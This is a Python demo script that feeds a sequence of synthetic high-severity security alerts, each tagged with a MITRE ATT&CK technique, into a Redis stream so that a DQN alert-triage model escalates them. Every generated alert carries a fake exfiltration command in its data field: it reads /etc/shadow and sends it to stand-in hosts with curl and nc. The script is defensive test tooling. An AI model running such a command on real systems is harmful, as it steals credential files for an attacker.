#!/usr/bin/env python3
"""Walk a single agent through a full kill-chain (CKC 1→7) to coax DQN
escalation, populating the Notifications tab.

The vanilla `smoke.py` fires a single privilege-escalation alert, which
the trained DQN happily marks LOW_ALERT. Notifications only show actions
≥ ESCALATE — so they stay empty.

This script fires a SEQUENCE of alerts on the same `agent_id` mapping to
progressively higher CKC stages, with high rule levels and credential-
exfiltration MITRE techniques. The aim is to drive the chain deep enough
that the DQN's argmax lands on ESCALATE (or higher) at least once.

Usage:
    python infra/scripts/escalate_demo.py [--agent-id 002] [--n 12]
                                          [--redis redis://localhost:6380/0]

Pre-conditions: same as `smoke.py` — workers up, models loaded.
"""

from __future__ import annotations

import argparse
import asyncio
import uuid
from datetime import datetime, timezone
from typing import Any

# (tactic_id, technique_id, ckc_stage, description) — broadly walks the
# attacker's lifecycle. Keep technique IDs that exist in docs/mitre_to_ckc.json.
_KILL_CHAIN: list[tuple[str, str, int, str]] = [
    ("TA0043", "T1595.002", 1, "Active vulnerability scan against perimeter"),
    ("TA0001", "T1190",     3, "Exploit public-facing application"),
    ("TA0002", "T1059",     4, "Command interpreter spawned (/bin/sh)"),
    ("TA0004", "T1548.003", 4, "Sudo abuse — privilege escalation attempt"),
    ("TA0003", "T1078",     5, "Persistence via valid account reuse"),
    ("TA0005", "T1070.004", 7, "Indicator removal: file deletion"),
    ("TA0006", "T1003",     7, "Credential dumping (LSASS / shadow)"),
    ("TA0007", "T1083",     7, "File and directory discovery on /etc"),
    ("TA0009", "T1005",     7, "Data collection from local system"),
    ("TA0040", "T1485",     7, "Data destruction — wiper observed"),
    ("TA0040", "T1565.001", 7, "Stored data manipulation on prod DB"),
    ("TA0011", "T1071",     6, "C2 callback over HTTPS to known sink"),
]


def make_high_threat_alert(
    *, agent_id: str, step: int, tactic: str, technique: str, level: int, desc: str,
) -> dict[str, Any]:
    alert_id = f"esc-{step:02d}-{uuid.uuid4().hex[:8]}"
    now = datetime.now(timezone.utc).isoformat()
    return {
        "_id": alert_id,
        "_source": {
            "id": alert_id,
            "@timestamp": now,
            "agent": {
                "id": agent_id,
                "name": f"Escalate-{agent_id}",
                "ip": f"10.0.0.{100 + step}",
            },
            "rule": {
                "id": str(80700 + step),
                "firedtimes": step + 1,
                "level": level,
                "description": desc,
                "mitre": {"tactic": [tactic], "technique": [technique]},
            },
            "decoder": {"name": "auditd"},
            "location": "/var/log/audit/audit.log",
            "full_log": f"type=SYSCALL step={step} {desc}",
            "data": {
                "command": (
                    "/usr/bin/bash -c "
                    "'curl -s http://attacker.example/exfil < /etc/shadow | "
                    "base64 | nc evil.invalid 4444'"
                ),
                "srcip": "10.0.0.42",
                "srcport": str(40000 + step),
                "srcuser": "compromised-svc",
            },
        },
    }


async def main() -> int:
    p = argparse.ArgumentParser(description=__doc__)
    p.add_argument("--redis", default="redis://localhost:6380/0")
    p.add_argument("--agent-id", default="002")
    p.add_argument("--n", type=int, default=len(_KILL_CHAIN))
    p.add_argument("--delay", type=float, default=2.0,
                   help="seconds between alerts")
    args = p.parse_args()

    import msgpack
    from redis.asyncio import Redis

    redis = Redis.from_url(args.redis, decode_responses=False)
    n = min(args.n, len(_KILL_CHAIN))
    print(f"▶ Escalation demo: agent={args.agent_id}, {n} steps")

    try:
        for step in range(n):
            tactic, technique, _ckc, desc = _KILL_CHAIN[step]
            alert = make_high_threat_alert(
                agent_id=args.agent_id, step=step,
                tactic=tactic, technique=technique,
                level=14,  # max severity
                desc=desc,
            )
            envelope = {
                "alertId": alert["_id"],
                "ingestedAt": datetime.now(timezone.utc).isoformat(),
                "rawJson": alert,
            }
            await redis.xadd(
                "strix:alerts:raw",
                {b"payload": msgpack.packb(envelope, use_bin_type=True)},
                maxlen=100_000, approximate=True,
            )
            print(f"  step {step+1:2d}/{n}  {tactic}/{technique:11s}  level=14  {desc[:60]}")
            if step < n - 1:
                await asyncio.sleep(args.delay)
    finally:
        await redis.aclose()

    print()
    print("✓ All alerts sent. Allow ~10s for the pipeline to drain, then check:")
    print("  - dashboard / vigilance feed for live updates")
    print("  - notifications page (any ESCALATE+ DQN actions show here)")
    print("  - psql:  SELECT action_name, count(*) FROM dqn_actions GROUP BY 1;")
    return 0


if __name__ == "__main__":
    raise SystemExit(asyncio.run(main()))
